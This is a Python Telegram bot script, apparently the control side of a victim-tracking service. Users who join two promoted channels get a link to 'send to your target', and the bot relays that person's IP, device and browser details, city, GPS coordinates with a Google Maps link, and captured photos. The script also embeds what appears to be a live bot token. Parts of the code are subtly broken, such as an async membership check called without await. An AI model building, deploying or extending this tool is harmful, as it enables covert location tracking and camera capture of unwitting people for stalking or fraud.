import json
import os
import threading
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton, WebAppInfo
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ========== CONFIG ==========
BOT_TOKEN = "8833219234:AAEroifFsySP5SanOscHruEn8jEnRJMpm5A"  # ← YAHAN APNA TOKEN DAALO
CHANNEL_1 = "@ABHIGYAN_API_MAKING_COURSE_FREE"      # Force join channel 1
CHANNEL_2 = "@abhigyanfinalchannel"      # Force join channel 2
APP_URL = "https://telegram-temp-number.onrender.com"  # ← Render URL yahan daalna
# ============================

victims_data = {}

def check_member(user_id, chat_id, context):
    """Check if user is member of channel"""
    try:
        member = context.bot.get_chat_member(chat_id=chat_id, user_id=user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    # Check force join
    ch1_ok = check_member(user.id, CHANNEL_1, context)
    ch2_ok = check_member(user.id, CHANNEL_2, context)
    
    if not (ch1_ok and ch2_ok):
        keyboard = [[InlineKeyboardButton("✅ Join Channel 1", url=f"https://t.me/{CHANNEL_1[1:]}")]]
        keyboard.append([InlineKeyboardButton("✅ Join Channel 2", url=f"https://t.me/{CHANNEL_2[1:]}")])
        keyboard.append([InlineKeyboardButton("🔄 Verify Membership", callback_data="verify")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "⚠️ *Access Denied!*\n\nYou must join both channels first:",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
        return
    
    # Verified - show menu
    keyboard = [
        [KeyboardButton("🔗 Create Tracking Link")],
        [KeyboardButton("📊 My Statistics")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(
        f"✅ *Welcome {user.first_name}!*\n\n"
        "You are verified. Click below to create your tracking link.",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def verify_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user
    
    ch1_ok = check_member(user.id, CHANNEL_1, context)
    ch2_ok = check_member(user.id, CHANNEL_2, context)
    
    if ch1_ok and ch2_ok:
        keyboard = [[KeyboardButton("🔗 Create Tracking Link")]]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await query.edit_message_text(
            "✅ *Verification Successful!*\n\nClick menu button below.",
            parse_mode="Markdown"
        )
        await context.bot.send_message(
            chat_id=user.id,
            text="Use the menu button below:",
            reply_markup=reply_markup
        )
    else:
        await query.edit_message_text(
            "❌ *Verification Failed!*\n\nPlease join both channels first.",
            parse_mode="Markdown"
        )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    
    if text == "🔗 Create Tracking Link":
        user_id = update.effective_user.id
        tracking_url = f"{APP_URL}/track?uid={user_id}"
        
        # Delete old data if any
        if str(user_id) in victims_data:
            del victims_data[str(user_id)]
        
        # Auto-clean after 1 hour
        threading.Timer(3600, lambda: victims_data.pop(str(user_id), None)).start()
        
        keyboard = [[InlineKeyboardButton("🔗 Copy Link", url=tracking_url)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"✅ *Your Tracking Link Ready!*\n\n"
            f"```\n{tracking_url}\n```\n\n"
            "Send this link to your target. All data will arrive here.",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )

async def send_victim_data(chat_id, data):
    """Send victim data to the bot user"""
    try:
        app = Application.builder().token(BOT_TOKEN).build()
        
        msg = f"🎯 *New Victim Data!*\n\n"
        msg += f"📡 *IP:* `{data.get('ip', 'N/A')}`\n"
        msg += f"📍 *IPv4:* `{data.get('ipv4', 'N/A')}`\n"
        msg += f"📍 *IPv6:* `{data.get('ipv6', 'N/A')}`\n"
        msg += f"💻 *Device:* `{data.get('device', 'N/A')}`\n"
        msg += f"🌐 *Browser:* `{data.get('browser', 'N/A')}`\n"
        msg += f"🖥 *OS:* `{data.get('os', 'N/A')}`\n"
        msg += f"📐 *Screen:* `{data.get('screen', 'N/A')}`\n"
        msg += f"🌍 *Location:* `{data.get('city', 'N/A')}, {data.get('country', 'N/A')}`\n"
        msg += f"⏰ *Time:* `{data.get('time', 'N/A')}`\n"
        
        if data.get('latitude') and data.get('longitude'):
            msg += f"\n🗺 *Live Location:*\n"
            msg += f"├ Lat: `{data['latitude']}`\n"
            msg += f"├ Lon: `{data['longitude']}`\n"
            msg += f"└ [📍 Google Maps](https://www.google.com/maps?q={data['latitude']},{data['longitude']})\n"
        
        if data.get('photos'):
            msg += f"\n📸 *Photos Captured:* {len(data['photos'])}\n"
            # Send first 3 photos
            for i, photo_url in enumerate(data['photos'][:3]):
                msg += f"├ 📷 Photo {i+1}: [View]({photo_url})\n"
        
        await app.bot.send_message(
            chat_id=chat_id,
            text=msg,
            parse_mode="Markdown",
            disable_web_page_preview=False
        )
        
    except Exception as e:
        print(f"[!] Error sending data: {e}")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(verify_callback, pattern="verify"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("[+] Bot started...")
    app.run_polling()

if __name__ == "__main__":
    main()
